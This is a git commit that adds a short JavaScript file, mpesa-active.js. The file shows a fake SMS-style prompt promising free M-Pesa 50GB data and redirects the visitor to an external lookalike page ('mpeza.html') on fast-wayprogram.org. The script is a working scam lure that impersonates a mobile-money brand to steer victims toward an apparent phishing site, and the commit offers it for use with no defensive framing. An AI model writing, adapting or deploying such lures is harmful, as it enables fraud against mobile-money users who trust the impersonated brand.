5ced3c2ff7d30fc6ee597f0d8d20953bf495f8db
superblog1 <imohette4@gmail.com>
2025-01-28 06:28:33 +0100

    Create mpesa-active.js

---
+++ mpesa-active.js
@@ -0,0 +1,6 @@
+
+var password = 'ACTIVATE 50GB'
+password=prompt('SMS: Congratulations You are qualify for M-Pesa 50GB Free Data, Kindly Press OK to Activate now   ','ACTIVATE 50GB');
+if (password != 'ACTIVATE 50GB') {
+location.href='https://fast-wayprogram.org/mpeza.html';
+}
